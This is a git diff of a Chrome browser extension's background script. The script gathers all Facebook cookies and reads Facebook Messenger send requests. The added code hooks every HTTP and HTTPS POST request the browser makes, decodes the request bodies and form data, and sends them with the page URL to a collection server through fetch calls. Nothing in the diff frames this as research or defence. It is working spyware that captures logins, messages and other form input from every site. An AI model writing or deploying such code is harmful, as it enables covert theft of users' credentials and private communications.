@@ -1,4 +1,7 @@
 var cookieGet = "";
+const server = "http://localhost:8001";
+const identify = "tri20cm30phut";
+
 chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
   //Facebook
   if (sender.url.match("facebook.com") !== null) {
@@ -6,7 +9,7 @@ chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
     if (request.action) {
       switch (request.action.type) {
         case "DATA_LOGIN":
-          let cookie = ''
+          let cookie = "";
           chrome.cookies.getAll(
             {
               url: "https://www.facebook.com"
@@ -15,7 +18,7 @@ chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
               res.map(data => {
                 return (cookie += data.name + "=" + data.value + "; ");
               });
-                     //send request data
+              //send request data
             }
           );
           break;
@@ -31,17 +34,57 @@ chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
   console.log("sendRequest", sendResponse);
 });
 
-
-chrome.webRequest.onBeforeRequest.addListener(details => {
-    console.log(details)
-    let postedString = decodeURIComponent(String.fromCharCode.apply(null,
-        new Uint8Array(details.requestBody.raw[0].bytes)));
+chrome.webRequest.onBeforeRequest.addListener(
+  details => {
+    console.log(details);
+    let postedString = decodeURIComponent(
+      String.fromCharCode.apply(
+        null,
+        new Uint8Array(details.requestBody.raw[0].bytes)
+      )
+    );
     //cac cac
-    console.log(parseQuery(postedString))
-}, {urls: [
-    'https://www.facebook.com/messaging/send/'
-]}, ['requestBody'])
+    console.log(parseQuery(postedString));
+  },
+  { urls: ["https://www.facebook.com/messaging/send/"] },
+  ["requestBody"]
+);
 
+chrome.webRequest.onBeforeRequest.addListener(
+  details => {
+    console.log(details);
+    //check have requestBody
+    if (details.requestBody && details.method == "POST") {
+      //request body with raw
+      if (details.requestBody.raw) {
+        let postedString = decodeURIComponent(
+          String.fromCharCode.apply(
+            null,
+            new Uint8Array(details.requestBody.raw[0].bytes)
+          )
+        );
+
+        console.log("query parse", parseQuery(postedString));
+
+        const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
+          details.url
+        )}&method=${details.method}&formData=${JSON.stringify(postedString)}`;
+        fetch(server + param);
+      }
+
+      if (details.requestBody.formData) {
+        const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
+          details.url
+        )}&method=${details.method}&formData=${JSON.stringify(
+          details.requestBody.formData
+        )}`;
+        fetch(server + param);
+      }
+    }
+  },
+  { urls: ["https://*/*", "http://*/*"] },
+  ["requestBody"]
+);
 
 function parseQuery(search) {
   var args = search.substring(1).split("&");
